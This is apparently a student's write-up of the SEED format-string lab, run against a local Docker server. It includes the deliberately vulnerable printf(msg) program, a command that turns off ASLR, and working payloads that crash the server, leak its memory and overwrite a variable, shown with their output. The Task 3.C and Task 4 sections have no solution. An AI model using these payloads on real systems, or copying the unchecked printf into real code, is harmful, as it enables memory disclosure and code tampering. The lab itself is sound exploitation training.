# Environment Setup

现代操作系统使用地址空间随机化来随机化堆和堆栈的起始地址。这使得猜测确切的地址变得困难; 猜测地址是格式字符串攻击的关键步骤之一。为了简化这个实验室的任务，我们使用以下命令关闭地址随机化:

```
$ sudo sysctl -w kernel.randomize_va_space=0
```

# The Vulnerable Program

在server-code目录执行

```
make 
make install 
```

服务器运行在10.9.0.5上，它运行一个带有格式字符串漏洞的32位程序

在Labsetup文件夹执行

```
docker-compose build # Build the container image
docker-compose up # Start the container
```

回显

```
Starting server-10.9.0.6 ... done
Attaching to server-10.9.0.5, server-10.9.0.6
```

在容器中运行shell

```
[03/27/23]seed@VM:~/.../Labsetup$ dockps
e17efb105f7d  server-10.9.0.6
1874c8677f7a  server-10.9.0.5
[03/27/23]seed@VM:~/.../Labsetup$ docksh e17
root@e17efb105f7d:/fmt#
```

服务器接受最多1500字节的数据。这个lab中的主要工作是构建不同的有效载荷，以利用服务器中的格式字符串漏洞，这样就可以实现每个任务中指定的目标。如果将有效负载保存在文件中，则可以使用以下命令将有效负载发送到服务器。

```
$ cat <file> | nc 10.9.0.5 9090
```

易受攻击的程序format. c

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 * Suggested value: between 10 and 400  */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif


#if __x86_64__
  unsigned long target = 0x1122334455667788;
#else
  unsigned int  target = 0x11223344;
#endif 

char *secret = "A secret message\n";

void dummy_function(char *str);

void myprintf(char *msg)
{
#if __x86_64__
    unsigned long int *framep;
    // Save the rbp value into framep
    asm("movq %%rbp, %0" : "=r" (framep));
    printf("Frame Pointer (inside myprintf):      0x%.16lx\n", (unsigned long) framep);
    printf("The target variable's value (before): 0x%.16lx\n", target);
#else
    unsigned int *framep;
    // Save the ebp value into framep
    asm("movl %%ebp, %0" : "=r"(framep));
    printf("Frame Pointer (inside myprintf):      0x%.8x\n", (unsigned int) framep);
    printf("The target variable's value (before): 0x%.8x\n",   target);
#endif

    // This line has a format-string vulnerability
    printf(msg);

#if __x86_64__
    printf("The target variable's value (after):  0x%.16lx\n", target);
#else
    printf("The target variable's value (after):  0x%.8x\n",   target);
#endif

}


int main(int argc, char **argv)
{
    char buf[1500];


#if __x86_64__
    printf("The input buffer's address:    0x%.16lx\n", (unsigned long) buf);
    printf("The secret message's address:  0x%.16lx\n", (unsigned long) secret);
    printf("The target variable's address: 0x%.16lx\n", (unsigned long) &target);
#else
    printf("The input buffer's address:    0x%.8x\n",   (unsigned int)  buf);
    printf("The secret message's address:  0x%.8x\n",   (unsigned int)  secret);
    printf("The target variable's address: 0x%.8x\n",   (unsigned int)  &target);
#endif

    printf("Waiting for user input ......\n"); 
    int length = fread(buf, sizeof(char), 1500, stdin);
    printf("Received %d bytes.\n", length);

    dummy_function(buf);
    printf("(^_^)(^_^)  Returned properly (^_^)(^_^)\n");

    return 1;
}

// This function is used to insert a stack frame between main and myprintf.
// The size of the frame can be adjusted at the compilation time. 
// The function itself does not do anything.
void dummy_function(char *str)
{
    char dummy_buffer[BUF_SIZE];
    memset(dummy_buffer, 0, BUF_SIZE);

    myprintf(str);
}
```

32位简略版本：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>

/* Changing this size will change the layout of the stack.
*/
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

unsigned int  target = 0x11223344;

char *secret = "A secret message\n";

void myprintf(char *msg)
{
    unsigned int *framep;
    // Save the ebp value into framep
    asm("movl %%ebp, %0" : "=r"(framep));
    printf("Frame Pointer (inside myprintf):      0x%.8x\n", (unsigned int) framep);
    printf("The target variable's value (before): 0x%.8x\n",   target);
    printf(msg);// This line has a format-string vulnerability
    printf("The target variable's value (after):  0x%.8x\n",   target);

}

int main(int argc, char **argv)
{
    char buf[1500];

    printf("The input buffer's address:    0x%.8x\n",   (unsigned int)  buf);
    printf("The secret message's address:  0x%.8x\n",   (unsigned int)  secret);
    printf("The target variable's address: 0x%.8x\n",   (unsigned int)  &target);

    printf("Waiting for user input ......\n"); 
    int length = fread(buf, sizeof(char), 1500, stdin);
    printf("Received %d bytes.\n", length);

    dummy_function(buf);
    printf("(^_^)(^_^)  Returned properly (^_^)(^_^)\n");

    return 1;
}
void dummy_function(char *str)
{
    char dummy_buffer[BUF_SIZE];
    memset(dummy_buffer, 0, BUF_SIZE);

    myprintf(str);
}
```

# Task 1: Crashing the Program

向服务器提供一个输入，这样当服务器程序试图打印 myprintf ()函数中的用户输入时，它就会崩溃

这是正常的输出：

```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd300
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 6 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd228
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | hello
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

为了使程序崩溃，只需要输入`%s%s%s%s%s%s%s%s%s`即可，总会有指针访问到不可访问的内存

crash成功的标志是不显示 `(_)(_)  Returned properly (_)(_)`

# Task 2: Printing Out the Server Program’s Memory

## Task 2.A: Stack Data

打印出堆栈上的数据。需要多少% x 格式说明符才能让服务器程序打印输入的前四个字节

> Difference between %p and %x in C/C++
>
> The %p is used to print the pointer value, and %x is **used to print hexadecimal values**. Though pointers can also be displayed using %u, or %x.

输入

```
$ echo AAAA_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x | nc 10.9.0.5 9090
```

回显

 ```
server-10.9.0.5 | AAAA_11223344_1000_8049db5_80e5320_80e61c0_ffffd300_ffffd228_80e62d4_80e5000_ffffd2c8_8049f7e_ffffd300_0_64_8049f47_80e5320_4ff_ffffd3dd_ffffd300_80e5320_80e9720_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_e2fa4d00_80e5000_80e5000_ffffd8e8_8049eff_ffffd300_dd_5dc_80e5320_0_0_0_ffffd9b4_0_0_0_dd_41414141_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825
 ```

可以看到41414141，这个就是我们写的AAAA

把放到1.txt里面，输入命令`grep -o '_' 1.txt | wc - l`

1.txt：

```
AAAA_11223344_1000_8049db5_80e5320_80e61c0_ffffd300_ffffd228_80e62d4_80e5000_ffffd2c8_8049f7e_ffffd300_0_64_8049f47_80e5320_4ff_ffffd3dd_ffffd300_80e5320_80e9720_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_e2fa4d00_80e5000_80e5000_ffffd8e8_8049eff_ffffd300_dd_5dc_80e5320_0_0_0_ffffd9b4_0_0_0_dd_41414141
```

64个%x

## Task 2.B: Heap Data

已知秘密信息地址为0x080b4008

我们输入的字符串最开始应该是秘密信息的地址，然后用63个%x让指针移动，64就是秘密信息的位置，使用%s打印

```python
#!/usr/bin/python3

import sys
N = 1500
content = bytearray(0x0 for i in range(N)) #填充0
secret  = 0x080b4008 #秘密信息的地址
content[0:4]  =  (secret).to_bytes(4,byteorder='little')#将最开始的内容改为秘密信息的地址
data = "%x"*63+"\nmessage:%s"#偏移
data = (data).encode('latin-1')
content[4:4+len(data)] = data
with open('bad', 'wb') as f:
  f.write(content)

```

回显

```
server-10.9.0.5 |@
                 1122334410008049db580e532080e61c0ffffd300ffffd22880e62d480e5000ffffd2c88049f7effffd3000648049f4780e53205dc5dcffffd300ffffd30080e97200000000000000000000000000151470080e500080e5000ffffd8e88049effffffd3005dc5dc80e5320000ffffd9b40005dc
server-10.9.0.5 | message:A secret message
```

# Task 3: Modifying the Server Program’s Memory

修改服务器程序中定义的目标变量的值(继续使用10.9.0.5)。Target 的原始值是0x11223344

## Task 3.A:

Change the value to a different value. In this sub-task, we need to change the content of
the target variable to something else. Your task is considered as a success if you can change it to a
different value, regardless of what value it may be. The address of the target variable can be found
from the server printout

改为任意值

```python
#!/usr/bin/python3
  
import sys
N = 1500
content = bytearray(0x0 for i in range(N))
secret  = 0x080e5068
content[0:4]  =  (secret).to_bytes(4,byteorder='little')
data = "%x"*63+"\ntarget changed:%n"
data = (data).encode('latin-1')
content[4:4+len(data)] = data
with open('bad', 'wb') as f:
  f.write(content)
```

```
server-10.9.0.5 | target changed:The target variable's value (after):  0x000000fc
```



## Task 3.B

 Change the value to 0x5000. In this sub-task, we need to change the content of the
target variable to a specific value 0x5000. Your task is considered as a success only if the vari-
able’s value becomes 0x5000.

将值更改为0x5000

```python
#!/usr/bin/python3
  
import sys
N = 1500
content = bytearray(0x0 for i in range(N))
secret  = 0x080e5068
content[0:4]  =  (secret).to_bytes(4,byteorder='little')
data = "%.8x"*62 + "%.19980x" + "%n"
data = (data).encode('latin-1')
content[4:4+len(data)] = data
with open('bad', 'wb') as f:
  f.write(content)

```

```
0000000000005dcThe target variable's value (after):  0x00005000
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```



## Task 3.C

Change the value to 0xAABBCCDD. This sub-task is similar to the previous one, except
that the target value is now a large number. In a format string attack, this value is the total number of
characters that are printed out by the printf() function; printing out this large number of characters
may take hours. You need to use a faster approach. The basic idea is to use %hn or %hhn, instead of
%n, so we can modify a two-byte (or one-byte) memory space, instead of four bytes. Printing out 216
characters does not take much time. More details can be found in the SEED book

将值更改为0xAABBCCDD



# Task 4: Inject Malicious Code into the Server Program

